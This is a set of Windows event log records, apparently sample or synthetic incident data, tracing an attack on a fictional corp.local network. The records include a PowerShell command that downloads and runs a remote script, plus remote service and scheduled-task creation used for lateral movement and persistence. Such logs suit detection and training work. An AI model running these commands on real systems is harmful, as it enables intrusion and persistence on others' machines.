{"EventID":4624,"TimeCreated":"2025-01-12T08:24:58Z","Computer":"APP-02.corp.local","Channel":"Security","Provider":"Microsoft-Windows-Security-Auditing","TargetUserName":"jdoe","TargetDomainName":"CORP","LogonType":3,"IpAddress":"10.10.20.57","WorkstationName":"WKSTN-07","SubjectUserName":"-","Message":"An account was successfully logged on."}
{"EventID":4697,"TimeCreated":"2025-01-12T08:25:47Z","Computer":"APP-02.corp.local","Channel":"Security","Provider":"Microsoft-Windows-Security-Auditing","ServiceName":"TempUpdater","ServiceFileName":"C:\\Windows\\Temp\\updater.exe","ServiceStartType":"auto start","SubjectUserName":"jdoe","SubjectDomainName":"CORP","Message":"A service was installed in the system."}
{"EventID":4698,"TimeCreated":"2025-01-12T08:27:16Z","Computer":"DB-01.corp.local","Channel":"Security","Provider":"Microsoft-Windows-Security-Auditing","TaskName":"\\UpdCache","TaskContent":"<Task><Triggers><TimeTrigger><StartBoundary>2025-01-12T08:30:00</StartBoundary></TimeTrigger></Triggers><Actions><Exec><Command>C:\\Windows\\Temp\\updater.exe</Command></Exec></Actions></Task>","SubjectUserName":"jdoe","SubjectDomainName":"CORP","ClientProcessId":"4950","Message":"A scheduled task was created."}
{"EventID":4104,"TimeCreated":"2025-01-12T08:14:23Z","Computer":"WKSTN-07.corp.local","Channel":"Microsoft-Windows-PowerShell/Operational","Provider":"Microsoft-Windows-PowerShell","UserId":"CORP\\jdoe","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('https://cdn.update-support.com/a/offer.ps1'); Invoke-Stage -Path C:\\ProgramData\\stage\\adsvc.exe","Path":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\__PSScriptPolicyTest.ps1","Message":"Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('https://cdn.update-support.com/a/offer.ps1')"}
{"EventID":4688,"TimeCreated":"2025-01-12T08:25:43Z","Computer":"WKSTN-07.corp.local","Channel":"Security","Provider":"Microsoft-Windows-Security-Auditing","NewProcessName":"C:\\Windows\\System32\\sc.exe","CommandLine":"sc.exe \\\\APP-02 create TempUpdater binPath= C:\\Windows\\Temp\\updater.exe start= auto","ParentProcessName":"C:\\ProgramData\\stage\\adsvc.exe","SubjectUserName":"jdoe","SubjectDomainName":"CORP","Message":"A new process has been created."}